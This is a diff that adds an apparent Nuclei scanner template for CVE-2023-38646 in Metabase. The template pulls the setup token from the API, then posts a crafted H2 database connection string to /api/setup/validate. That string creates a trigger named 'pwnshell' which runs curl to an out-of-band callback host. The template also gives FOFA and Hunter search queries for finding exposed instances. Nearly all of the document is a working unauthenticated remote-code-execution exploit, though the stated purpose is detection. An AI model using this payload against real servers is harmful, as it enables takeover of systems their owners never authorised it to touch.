@@ -1,0 +1,60 @@
+http:
+- attack: clusterbomb
+  extractors:
+  - group: 1
+    internal: true
+    name: token
+    part: body_1
+    regex:
+    - '"setup-token":"(.*?)"'
+    type: regex
+  matchers:
+  - name: http
+    part: interactsh_protocol
+    type: word
+    words:
+    - http
+  - name: dns
+    part: interactsh_protocol
+    type: word
+    words:
+    - dns
+  matchers-condition: or
+  raw:
+  - 'GET /api/session/properties HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36
+    (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36
+
+    Content-Type: application/json
+
+    '
+  - "POST /api/setup/validate HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
+    Content-Length: 812\n\n{\n    \"token\": \"{{token}}\",\n    \"details\":\n  \
+    \  {\n        \"is_on_demand\": false,\n        \"is_full_sync\": false,\n   \
+    \     \"is_sample\": false,\n        \"cache_ttl\": null,\n        \"refingerprint\"\
+    : false,\n        \"auto_run_queries\": true,\n        \"schedules\":\n      \
+    \  {},\n        \"details\":\n        {\n            \"db\": \"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\
+    \\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\\
+    njava.lang.Runtime.getRuntime().exec('curl {{interactsh-url}}')\\n$$--=x\",\n\
+    \            \"advanced-options\": false,\n            \"ssl\": true\n       \
+    \ },\n        \"name\": \"an-sec-research-team\",\n        \"engine\": \"h2\"\n\
+    \    }\n}\n"
+id: Metabase-validate
+info:
+  author: Zero Trust Security Attack and Defense Laboratory
+  description: 'Metabase is an open source data analysis and visualization tool that
+    helps users easily connect to various data sources, including databases, cloud
+    services, and APIs, and then use an intuitive interface for data query, analysis,
+    and visualization. Unauthenticated remote attackers can exploit this vulnerability
+    to execute arbitrary commands on the server with the privileges of running the
+    Metabase server
+
+    '
+  metadata:
+    fofa-query: app="Metabase"
+    hunter-query: app.name="Metabase"
+  name: Metabase validate remote command execution vulnerability CVE-2023-38646
+  severity: high
